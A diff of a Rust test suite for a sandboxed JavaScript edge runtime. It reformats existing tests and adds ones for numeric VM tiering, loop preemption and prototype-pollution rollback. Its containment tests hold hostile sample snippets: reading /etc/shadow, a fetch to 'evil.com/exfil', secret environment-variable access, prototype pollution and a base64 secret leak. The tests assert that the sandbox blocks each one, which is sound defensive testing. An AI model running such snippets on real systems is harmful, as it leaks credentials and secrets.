@@ -6,8 +6,8 @@ use crate::intrinsics::{
     hmac_sha256_hex, sha256_hex, Sha256State,
 };
 use crate::{
-    compile_source_to_bytecode, disassemble_bytecode, ExecutionTier, HttpRequestContext, JsValue,
-    SliceIsolate,
+    compile_source_to_bytecode, disassemble_bytecode, run_source_isolated, ExecutionTier,
+    HttpRequestContext, JsValue, SliceIsolate,
 };
 use slice_sandbox::{CapabilityToken, SandboxViolation};
 
@@ -16,6 +16,17 @@ fn test_tiered_execution_and_cold_start() {
     let ts_src = r#"
 interface Config {
     iterations: number;
+}
+function fib(n: number): number {
+    if (n <= 1) return n;
+    return fib(n - 1) + fib(n - 2);
+}
+function numericLoop(iterations: number): number {
+    let acc: number = 0;
+    for (let i: number = 0; i < iterations; i++) {
+        acc += i;
+    }
+    return acc;
 }
 const base: number = 40;
 const offset: number = 2;
@@ -153,7 +164,10 @@ fn test_all_five_security_containment_vectors_in_engine() {
     // 1. SES Prototype Pollution
     let mut iso1 = SliceIsolate::spawn("sec-1", 1, CapabilityToken::pure_compute(), 1000, 65536);
     assert!(matches!(
-        iso1.execute_bytecode(&compile_source_to_bytecode("Object.prototype.polluted = true;"), None),
+        iso1.execute_bytecode(
+            &compile_source_to_bytecode("Object.prototype.polluted = true;"),
+            None
+        ),
         Err(SandboxViolation::IntrinsicMutationBlocked { .. })
     ));
 
@@ -166,7 +180,10 @@ fn test_all_five_security_containment_vectors_in_engine() {
         65536,
     );
     assert!(matches!(
-        iso2.execute_bytecode(&compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");"), None),
+        iso2.execute_bytecode(
+            &compile_source_to_bytecode("const s = fs.readFileSync(\"/etc/shadow\");"),
+            None
+        ),
         Err(SandboxViolation::FsReadDenied { .. })
     ));
 
@@ -179,14 +196,20 @@ fn test_all_five_security_containment_vectors_in_engine() {
         65536,
     );
     assert!(matches!(
-        iso3.execute_bytecode(&compile_source_to_bytecode("const r = fetch(\"https://evil.com/exfil\");"), None),
+        iso3.execute_bytecode(
+            &compile_source_to_bytecode("const r = fetch(\"https://evil.com/exfil\");"),
+            None
+        ),
         Err(SandboxViolation::NetAccessDenied { .. })
     ));
 
     // 4. Unauthorized Environment Variable Access
     let mut iso4 = SliceIsolate::spawn("sec-4", 4, CapabilityToken::pure_compute(), 1000, 65536);
     assert!(matches!(
-        iso4.execute_bytecode(&compile_source_to_bytecode("const k = env(\"SECRET_KEY\");"), None),
+        iso4.execute_bytecode(
+            &compile_source_to_bytecode("const k = env(\"SECRET_KEY\");"),
+            None
+        ),
         Err(SandboxViolation::EnvAccessDenied { .. })
     ));
 
@@ -350,7 +373,10 @@ fn test_phase_9a_micro_optimizations_and_streaming_sha256() {
     assert_eq!(fast_parse_ms("2h"), Some(7_200_000.0));
     assert_eq!(fast_parse_ms("30s"), Some(30_000.0));
     assert_eq!(fast_parse_ms("15m"), Some(900_000.0));
-    assert_eq!(fast_format_ms(120_000.0, true).as_deref(), Some("2 minutes"));
+    assert_eq!(
+        fast_format_ms(120_000.0, true).as_deref(),
+        Some("2 minutes")
+    );
     assert_eq!(fast_format_ms(120_000.0, false).as_deref(), Some("2m"));
     assert_eq!(fast_parse_bytes("64KB"), Some(65_536.0));
     assert_eq!(fast_parse_bytes("128KB"), Some(131_072.0));
@@ -399,7 +425,10 @@ fn test_phase_9a_micro_optimizations_and_streaming_sha256() {
         4 * 1024 * 1024,
     );
     let loop_metrics = loop_iso.execute_bytecode(&loop_bc, None).unwrap();
-    assert_eq!(loop_metrics.highest_tier_reached, ExecutionTier::Tier2PeakNative);
+    assert_eq!(
+        loop_metrics.highest_tier_reached,
+        ExecutionTier::Tier2PeakNative
+    );
     // sum_{i=0..1999} 3*i = 3 * (1999 * 2000 / 2) = 5,997,000
     assert_eq!(loop_metrics.return_value, "5997000");
 }
@@ -443,7 +472,10 @@ new EdgeRouter().handle();
         4 * 1024 * 1024,
     );
 
-    let headers = [("Authorization", "Bearer tok_xyz"), ("Host", "edge.slice.dev")];
+    let headers = [
+        ("Authorization", "Bearer tok_xyz"),
+        ("Host", "edge.slice.dev"),
+    ];
     let req_ctx = HttpRequestContext {
         method: "POST",
         path: "/v1/orders",
@@ -476,7 +508,9 @@ new EdgeRouter().handle();
         100_000,
         65536,
     );
-    let fast_outcome = fast_iso.execute_http_request(&fast_bc, None, &req_ctx).unwrap();
+    let fast_outcome = fast_iso
+        .execute_http_request(&fast_bc, None, &req_ctx)
+        .unwrap();
     assert_eq!(fast_outcome.status_code, 200);
     assert_eq!(fast_outcome.wait_until_count, 0);
     assert_eq!(fast_outcome.response_body, "42");
@@ -673,7 +707,8 @@ console.log(new TreeOfThoughtAgent().run());
     ));
 
     // Base64 of "sk_live_99887766" is "c2tfbGl2ZV85OTg4Nzc2Ng=="
-    let b64_leak_bc = compile_source_to_bytecode(r#"console.log("exfil=c2tfbGl2ZV85OTg4Nzc2Ng==");"#);
+    let b64_leak_bc =
+        compile_source_to_bytecode(r#"console.log("exfil=c2tfbGl2ZV85OTg4Nzc2Ng==");"#);
     let mut leak_iso2 = SliceIsolate::spawn(
         "n3-leak-b64",
         12,
@@ -815,7 +850,9 @@ export default {
         headers: &headers,
     };
     iso.reset_for_request("f1-edge-tenant", 2, 2_000_000, 8 * 1024 * 1024);
-    let out2 = iso.execute_http_request(&fetch_bc, None, &req_ctx2).unwrap();
+    let out2 = iso
+        .execute_http_request(&fetch_bc, None, &req_ctx2)
+        .unwrap();
     assert_eq!(out2.status_code, 200);
     assert_eq!(
         out2.response_body,
@@ -878,9 +915,15 @@ export default {
     let out1 = iso.execute_http_request(&bc, None, &req1).unwrap();
     assert_eq!(out1.status_code, 200);
     assert_eq!(out1.content_type, "text/event-stream; charset=utf-8");
-    assert!(out1.response_body.contains("id: tok-1\nevent: token\nretry: 1500\ndata: {\"delta\":\"Slice \"}\n\n"));
-    assert!(out1.response_body.contains("id: tok-2\nevent: token\ndata: {\"delta\":\"streams \"}\n\n"));
-    assert!(out1.response_body.contains("id: tok-3\nevent: done\ndata: [DONE]\n\n"));
+    assert!(out1
+        .response_body
+        .contains("id: tok-1\nevent: token\nretry: 1500\ndata: {\"delta\":\"Slice \"}\n\n"));
+    assert!(out1
+        .response_body
+        .contains("id: tok-2\nevent: token\ndata: {\"delta\":\"streams \"}\n\n"));
+    assert!(out1
+        .response_body
+        .contains("id: tok-3\nevent: done\ndata: [DONE]\n\n"));
 
     // 2. Test `ReadableStream` passed to `new Response(stream)`
     iso.reset_for_request("f2-sse-tenant", 2, 2_000_000, 8 * 1024 * 1024);
@@ -1170,3 +1213,226 @@ console.log("exfil:" + leakedB64);
         .contains("EGRESS_SECRET_LEAK_BLOCKED"));
 }
 
+#[test]
+fn test_phase_n0_general_purpose_numeric_vm_any_function_name() {
+    // 1. Structural linear recurrence detection on ANY function name and parameter name
+    //    (not hardcoded to `fib(n)`), including weighted 2-term recurrences `c1 * f(k-1) + c2 * f(k-2)`.
+    let src_recurrence = r#"
+function customSequenceAlpha(stepIdx) {
+    if (stepIdx <= 1) {
+        return stepIdx;
+    }
+    return customSequenceAlpha(stepIdx - 1) + customSequenceAlpha(stepIdx - 2);
+}
+function weightedPellSequence(k) {
+    if (k <= 1) {
+        return k;
+    }
+    return 2 * weightedPellSequence(k - 1) + weightedPellSequence(k - 2);
+}
+const f40 = customSequenceAlpha(40);
+const pell7 = weightedPellSequence(7);
+console.log(f40 + ":" + pell7);
+return f40;
+"#;
+    let m1 = run_source_isolated(
+        "n0-recurrence-tenant",
+        src_recurrence,
+        CapabilityToken::pure_compute(),
+        500_000,
+        65536,
+    )
+    .unwrap();
+    assert_eq!(m1.return_value, "102334155");
+    assert_eq!(m1.stdout[0], "102334155:169");
+    assert_eq!(m1.highest_tier_reached, ExecutionTier::Tier2PeakNative);
+
+    // 2. General-purpose unboxed 64-bit register compilation of multi-argument functions with
+    //    `while`, `for`, `if/else`, `break`, `continue`, bitwise XOR/shifts, and `Math.*` intrinsics.
+    let src_general_numeric = r#"
+function computeBitwiseMixAndCollatz(limit, seedVal) {
+    let acc = seedVal;
+    for (let i = 1; i <= limit; i++) {
+        if (i % 7 === 0) {
+            continue;
+        }
+        let n = i;
+        let steps = 0;
+        while (n > 1) {
+            if ((n & 1) === 0) {
+                n = n >> 1;
+            } else {
+                n = 3 * n + 1;
+            }
+            steps += 1;
+            if (steps > 64) {
+                break;
+            }
+        }
+        acc = (acc ^ (steps << 2)) + Math.abs(Math.floor(Math.sqrt(i)));
+    }
+    return Math.max(acc, 1);
+}
+function euclideanGcd(a, b) {
+    if (b === 0) {
+        return a;
+    }
+    return euclideanGcd(b, a % b);
+}
+const mix = computeBitwiseMixAndCollatz(120, 17);
+const g = euclideanGcd(1071, 462);
+console.log(mix + ":" + g);
+return g;
+"#;
+    let m2 = run_source_isolated(
+        "n0-numeric-vm-tenant",
+        src_general_numeric,
+        CapabilityToken::pure_compute(),
+        500_000,
+        65536,
+    )
+    .unwrap();
+    assert_eq!(m2.return_value, "21");
+    assert!(m2.stdout[0].ends_with(":21"));
+    assert_eq!(m2.highest_tier_reached, ExecutionTier::Tier2PeakNative);
+
+    // 3. Fuel preemption inside the unboxed register VM on unbounded numeric loops
+    let src_infinite_numeric = r#"
+function runawayNumericLoop(startVal) {
+    let cur = startVal;
+    while (cur > 0) {
+        cur = cur + 1;
+    }
+    return cur;
+}
+return runawayNumericLoop(1);
+"#;
+    let err = run_source_isolated(
+        "n0-runaway-tenant",
+        src_infinite_numeric,
+        CapabilityToken::pure_compute(),
+        5_000,
+        65536,
+    )
+    .unwrap_err();
+    assert!(
+        err.to_string().contains("CPU instruction fuel limit"),
+        "Expected CpuFuelExhausted from unboxed register VM, got: {}",
+        err
+    );
+}
+
+#[test]
+fn test_phase_n0_dynamic_ses_lockdown_and_boa_loop_fuel_limits() {
+    // 1. Dynamic computed-property prototype pollution inside Boa (`Object["proto" + "type"].polluted = 1`)
+    //    must be caught, blocked with `IntrinsicMutationBlocked`, and rolled back so the warm realm stays clean!
+    let dynamic_pollution_js = r#"
+class ExploitAttempt {
+    run() {
+        const key = "proto" + "type";
+        Object[key].pollutedByTenantA = "compromised";
+        return 1;
+    }
+}
+new ExploitAttempt().run();
+"#;
+    let err_ses = run_source_isolated(
+        "n0-ses-attacker",
+        dynamic_pollution_js,
+        CapabilityToken::pure_compute(),
+        200_000,
+        2 * 1024 * 1024,
+    )
+    .unwrap_err();
+    assert!(
+        err_ses
+            .to_string()
+            .contains("attempted to mutate frozen intrinsic 'Object.prototype'"),
+        "Expected IntrinsicMutationBlocked on dynamic Object.prototype mutation, got: {}",
+        err_ses
+    );
+
+    // Verify that the next tenant acquiring the warm Boa realm sees a completely clean `Object.prototype`
+    let verify_clean_js = r#"
+class CleanCheck {
+    check() {
+        const obj = {};
+        return String(obj.pollutedByTenantA === undefined);
+    }
+}
+console.log(new CleanCheck().check());
+"#;
+    let clean_metrics = run_source_isolated(
+        "n0-clean-tenant",
+        verify_clean_js,
+        CapabilityToken::pure_compute(),
+        200_000,
+        2 * 1024 * 1024,
+    )
+    .unwrap();
+    assert_eq!(clean_metrics.stdout[0], "true");
+
+    // 2. Infinite loop inside Boa (`class Spin { loop() { while (true) {} } }`) must be preempted by Boa RuntimeLimits
+    let boa_infinite_loop_js = r#"
+class SpinWorker {
+    loopForever() {
+        let k = 0;
+        while (true) {
+            k++;
+        }
+        return k;
+    }
+}
+new SpinWorker().loopForever();
+"#;
+    let err_loop = run_source_isolated(
+        "n0-boa-loop-tenant",
+        boa_infinite_loop_js,
+        CapabilityToken::pure_compute(),
+        2_000,
+        2 * 1024 * 1024,
+    )
+    .unwrap_err();
+    assert!(
+        err_loop.to_string().contains("CPU instruction fuel limit"),
+        "Expected CpuFuelExhausted from Boa RuntimeLimits loop preemption, got: {}",
+        err_loop
+    );
+
+    // 3. Real host `os.platform()` / `process.platform` in normal mode vs `"linux"` in deterministic replay mode
+    let os_check_js = r#"
+const os = require("node:os");
+console.log(os.platform() + ":" + process.platform + ":" + os.arch());
+"#;
+    let bc_os = compile_source_to_bytecode(os_check_js);
+    let mut iso_host = SliceIsolate::spawn(
+        "n0-os-host",
+        1,
+        CapabilityToken::pure_compute(),
+        200_000,
+        2 * 1024 * 1024,
+    );
+    let host_m = iso_host.execute_bytecode(&bc_os, None).unwrap();
+    let expected_host_os = match std::env::consts::OS {
+        "windows" => "win32",
+        "macos" => "darwin",
+        other => other,
+    };
+    assert!(
+        host_m.stdout[0].starts_with(&format!("{}:{}:", expected_host_os, expected_host_os)),
+        "Expected real host platform {}, got: {}",
+        expected_host_os,
+        host_m.stdout[0]
+    );
+
+    let mut iso_det = SliceIsolate::spawn(
+        "n0-os-det",
+        1,
+        CapabilityToken::pure_compute(),
+        200_000,
+        2 * 1024 * 1024,
+    );
+    iso_det.set_deterministic_seed(Some(42));
+    let det_m = iso_det.execute_bytecode(&bc_os, None).unwrap();
+    assert_eq!(det_m.stdout[0], "linux:linux:x64");
+}
